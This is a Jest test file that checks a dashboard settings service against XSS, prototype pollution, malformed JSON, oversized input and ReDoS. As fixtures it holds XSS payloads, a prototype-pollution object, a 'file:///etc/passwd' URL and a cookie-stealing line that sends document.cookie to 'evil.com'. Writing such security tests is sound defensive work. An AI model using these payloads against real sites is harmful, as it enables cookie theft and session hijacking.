/**
 * Edge Case Tests: Input Validation & Security
 * Tests for XSS prevention, input sanitization, and security edge cases
 */

import { afterAll, beforeAll, beforeEach, describe, expect, jest,test } from '@jest/globals';

import { CORSStrategy } from '../../contexts/SettingsContext';
import { SettingsIntegrationService } from '../../services/SettingsIntegrationService';

// Mock localStorage for security tests
const mockLocalStorage = (() => {
  let store: Record<string, string> = {};
  return {
    getItem: jest.fn((key: string) => store[key] || null),
    setItem: jest.fn((key: string, value: string) => {
      store[key] = value;
    }),
    removeItem: jest.fn((key: string) => {
      delete store[key];
    }),
    clear: jest.fn(() => {
      store = {};
    }),
  };
})();

Object.defineProperty(window, 'localStorage', { value: mockLocalStorage });

// Mock console to capture security warnings
const originalConsoleError = console.error;
const originalConsoleWarn = console.warn;
beforeAll(() => {
  console.error = jest.fn();
  console.warn = jest.fn();
});

afterAll(() => {
  console.error = originalConsoleError;
  console.warn = originalConsoleWarn;
});

beforeEach(() => {
  jest.clearAllMocks();
  mockLocalStorage.clear();
});

describe('Input Validation & Security Edge Cases', () => {
  
  describe('XSS Prevention', () => {
    test('should handle script injection attempts in settings values', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'javascript:alert(1)',
        'onload="alert(1)"',
        '"><script>alert(1)</script>',
        '\'"--></style></script><script>alert(1)</script>',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox("xss")',
        '<img src=x onerror=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<svg onload=alert(1)>',
      ];

      maliciousInputs.forEach(input => {
        expect(() => {
          // Test with malicious input in URL detection
          SettingsIntegrationService.detectProtocolFromUrl(input);
        }).not.toThrow();

        expect(() => {
          // Test with malicious input in proxy URL generation
          SettingsIntegrationService.getProxyUrl(input);
        }).not.toThrow();
      });

      // Should not execute any scripts
      expect(console.error).not.toHaveBeenCalledWith(
        expect.stringContaining('script executed')
      );
    });

    test('should sanitize localStorage data from XSS attempts', () => {
      const maliciousSettings = {
        display: {
          theme: '<script>alert("xss")</script>',
          density: 'compact',
          fontSize: 14
        },
        cors: {
          defaultStrategy: 'RSS2JSON<script>alert(1)</script>' as any,
          protocolStrategies: {},
          services: {
            rss2json: ['<script>alert(1)</script>'],
            corsProxies: ['javascript:alert(1)']
          },
          fallbackChain: []
        }
      };

      // Store malicious data
      mockLocalStorage.setItem('dashboardSettings', JSON.stringify(maliciousSettings));

      // Load settings should handle malicious data gracefully
      expect(() => {
        const loaded = SettingsIntegrationService.loadSettings();
        expect(loaded).toBeDefined();
      }).not.toThrow();
    });

    test('should prevent prototype pollution attacks', () => {
      const maliciousJSON = JSON.stringify({
        __proto__: { isAdmin: true },
        constructor: { prototype: { isAdmin: true } },
        display: {
          theme: 'dark',
          density: 'compact',
          fontSize: 14
        }
      });

      mockLocalStorage.setItem('dashboardSettings', maliciousJSON);

      const settings = SettingsIntegrationService.loadSettings();
      
      // Should not pollute prototype
      expect((Object.prototype as any).isAdmin).toBeUndefined();
      expect(settings.constructor.prototype.isAdmin).toBeUndefined();
    });
  });

  describe('Input Boundary Testing', () => {
    test('should handle extremely large input values', () => {
      const largeString = 'a'.repeat(1000000); // 1MB string
      const largeArray = Array(100000).fill('large-value');
      const largeObject = Object.fromEntries(
        Array(10000).fill(0).map((_, i) => [`key${i}`, `value${i}`])
      );

      expect(() => {
        SettingsIntegrationService.detectProtocolFromUrl(largeString);
      }).not.toThrow();

      expect(() => {
        SettingsIntegrationService.getProxyUrl(largeString);
      }).not.toThrow();

      // Test with large settings object
      const largeSettings = {
        display: { theme: 'dark', density: 'compact', fontSize: 14 },
        cors: {
          defaultStrategy: CORSStrategy.RSS2JSON,
          protocolStrategies: largeObject,
          services: {
            rss2json: largeArray,
            corsProxies: largeArray
          },
          fallbackChain: Array(10000).fill(CORSStrategy.DIRECT)
        }
      };

      expect(() => {
        mockLocalStorage.setItem('testLarge', JSON.stringify(largeSettings));
        SettingsIntegrationService.loadSettings();
      }).not.toThrow();
    });

    test('should handle null and undefined inputs gracefully', () => {
      const nullUndefinedInputs = [
        null,
        undefined,
        '',
        0,
        false,
        NaN,
        Infinity,
        -Infinity,
      ];

      nullUndefinedInputs.forEach(input => {
        expect(() => {
          SettingsIntegrationService.detectProtocolFromUrl(input as any);
        }).not.toThrow();

        expect(() => {
          SettingsIntegrationService.getProxyUrl(input as any);
        }).not.toThrow();
      });
    });

    test('should handle circular references in settings', () => {
      const circularObject: any = { 
        display: { theme: 'dark', density: 'compact', fontSize: 14 }
      };
      circularObject.self = circularObject;

      expect(() => {
        // This should fail to stringify but not crash the service
        JSON.stringify(circularObject);
      }).toThrow();

      // Service should handle this gracefully
      expect(() => {
        SettingsIntegrationService.loadSettings();
      }).not.toThrow();
    });

    test('should handle invalid JSON gracefully', () => {
      const invalidJSONStrings = [
        '{invalid json}',
        '{"unclosed": "string}',
        '{"trailing": "comma",}',
        '{"unquoted": key}',
        'undefined',
        'function() { return true; }',
        '<xml>not json</xml>',
        'true, false',
        '[1, 2, 3,]',
      ];

      invalidJSONStrings.forEach(invalidJSON => {
        mockLocalStorage.setItem('dashboardSettings', invalidJSON);
        
        expect(() => {
          SettingsIntegrationService.loadSettings();
        }).not.toThrow();
        
        // Should log appropriate errors
        expect(console.error).toHaveBeenCalled();
        jest.clearAllMocks();
      });
    });
  });

  describe('Type Safety and Validation', () => {
    test('should handle type mismatches in settings', () => {
      const typeMismatchSettings = {
        display: {
          theme: 123, // should be string
          density: true, // should be string
          fontSize: 'large' // should be number
        },
        cors: {
          defaultStrategy: 999, // should be CORSStrategy enum
          protocolStrategies: 'not an object',
          services: {
            rss2json: 'not an array',
            corsProxies: null
          },
          fallbackChain: 'not an array'
        },
        protocols: {
          priority: 'not an array',
          settings: 'not an object',
          autoDetect: 'not a boolean',
          fallbackEnabled: 123
        }
      };

      mockLocalStorage.setItem('dashboardSettings', JSON.stringify(typeMismatchSettings));

      expect(() => {
        const settings = SettingsIntegrationService.loadSettings();
        expect(settings).toBeDefined();
      }).not.toThrow();
    });

    test('should handle missing required properties', () => {
      const incompleteSettings = {
        display: {
          // missing theme, density, fontSize
        },
        cors: {
          // missing defaultStrategy and other required fields
        }
        // missing protocols, verification, etc.
      };

      mockLocalStorage.setItem('dashboardSettings', JSON.stringify(incompleteSettings));

      expect(() => {
        const settings = SettingsIntegrationService.loadSettings();
        expect(settings).toBeDefined();
      }).not.toThrow();
    });

    test('should validate URL formats in settings', () => {
      const invalidUrls = [
        'not-a-url',
        'http://',
        'https://',
        'ftp://incomplete',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        '//example.com',
        'http://[invalid-ipv6',
        'https://example.com:abc',
        'file:///etc/passwd',
        'mailto:admin@example.com',
      ];

      const settingsWithInvalidUrls = {
        cors: {
          defaultStrategy: CORSStrategy.RSS2JSON,
          protocolStrategies: {},
          services: {
            rss2json: invalidUrls,
            corsProxies: invalidUrls
          },
          fallbackChain: []
        }
      };

      mockLocalStorage.setItem('dashboardSettings', JSON.stringify(settingsWithInvalidUrls));

      expect(() => {
        SettingsIntegrationService.loadSettings();
        SettingsIntegrationService.getCORSProxyChain();
      }).not.toThrow();
    });
  });

  describe('Error Handling and Recovery', () => {
    test('should recover from corrupted settings gracefully', () => {
      // Simulate various corruption scenarios
      const corruptionScenarios = [
        'null',
        '{}',
        '{"broken": truncated',
        Buffer.from([0xFF, 0xFE, 0xFD]).toString(), // Binary data
        String.fromCharCode(0) + '{"display":{}}', // Null bytes
      ];

      corruptionScenarios.forEach(corruptedData => {
        mockLocalStorage.setItem('dashboardSettings', corruptedData);
        
        expect(() => {
          const settings = SettingsIntegrationService.loadSettings();
          expect(typeof settings).toBe('object');
        }).not.toThrow();
        
        jest.clearAllMocks();
      });
    });

    test('should handle localStorage exceptions gracefully', () => {
      const originalGetItem = mockLocalStorage.getItem;
      
      // Mock various localStorage exceptions
      mockLocalStorage.getItem = jest.fn(() => {
        throw new DOMException('SecurityError', 'SecurityError');
      });

      expect(() => {
        SettingsIntegrationService.loadSettings();
      }).not.toThrow();

      mockLocalStorage.getItem = jest.fn(() => {
        throw new Error('Unexpected error');
      });

      expect(() => {
        SettingsIntegrationService.loadSettings();
      }).not.toThrow();

      // Restore original function
      mockLocalStorage.getItem = originalGetItem;
    });

    test('should handle extremely deep object nesting', () => {
      // Create deeply nested object
      let deepObject: any = { display: { theme: 'dark', density: 'compact', fontSize: 14 } };
      for (let i = 0; i < 1000; i++) {
        deepObject = { nested: deepObject };
      }

      expect(() => {
        mockLocalStorage.setItem('deepSettings', JSON.stringify(deepObject));
      }).toThrow(); // JSON.stringify should fail with deeply nested objects

      expect(() => {
        SettingsIntegrationService.loadSettings();
      }).not.toThrow(); // But service should handle it gracefully
    });
  });

  describe('Cross-Frame and Iframe Security', () => {
    test('should handle settings access from different origins', () => {
      // Mock different origin access attempt
      const originalLocation = window.location;
      Object.defineProperty(window, 'location', {
        value: { ...originalLocation, origin: 'https://different-origin.com' },
        writable: true
      });

      expect(() => {
        SettingsIntegrationService.loadSettings();
        SettingsIntegrationService.applyThemeSettings();
      }).not.toThrow();

      // Restore original location
      Object.defineProperty(window, 'location', {
        value: originalLocation,
        writable: true
      });
    });

    test('should prevent settings injection from external sources', () => {
      // Simulate external script trying to inject malicious settings
      const externalMaliciousSettings = {
        display: { theme: 'dark', density: 'compact', fontSize: 14 },
        malicious: {
          executeScript: '<script>window.parent.postMessage("hacked", "*")</script>',
          stealData: 'javascript:document.location="http://evil.com/steal?data="+document.cookie'
        }
      };

      mockLocalStorage.setItem('dashboardSettings', JSON.stringify(externalMaliciousSettings));

      const settings = SettingsIntegrationService.loadSettings();
      
      // Should not include malicious properties
      expect((settings as any).malicious).toBeUndefined();
    });
  });

  describe('Performance Security', () => {
    test('should prevent ReDoS (Regular Expression Denial of Service)', () => {
      const maliciousStrings = [
        // Catastrophic backtracking patterns
        'a'.repeat(100000) + '!',
        '((a+)+)+b',
        'a'.repeat(50000) + 'X',
        // Deeply nested patterns
        '('.repeat(10000) + 'a' + ')'.repeat(10000),
      ];

      maliciousStrings.forEach(maliciousString => {
        const startTime = performance.now();
        
        expect(() => {
          SettingsIntegrationService.detectProtocolFromUrl(maliciousString);
        }).not.toThrow();
        
        const endTime = performance.now();
        const duration = endTime - startTime;
        
        // Should complete quickly, not hang
        expect(duration).toBeLessThan(1000); // 1 second max
      });
    });

    test('should limit resource consumption for malicious input', () => {
      const resourceIntensiveInputs = [
        JSON.stringify(Array(100000).fill('data')), // Large array
        'x'.repeat(1000000), // Very long string
        JSON.stringify(Object.fromEntries(
          Array(50000).fill(0).map((_, i) => [`key${i}`, `value${i}`])
        )), // Large object
      ];

      resourceIntensiveInputs.forEach(input => {
        const startTime = performance.now();
        
        mockLocalStorage.setItem('dashboardSettings', input);
        
        expect(() => {
          SettingsIntegrationService.loadSettings();
        }).not.toThrow();
        
        const endTime = performance.now();
        const duration = endTime - startTime;
        
        // Should complete within reasonable time
        expect(duration).toBeLessThan(2000); // 2 seconds max
      });
    });
  });
});
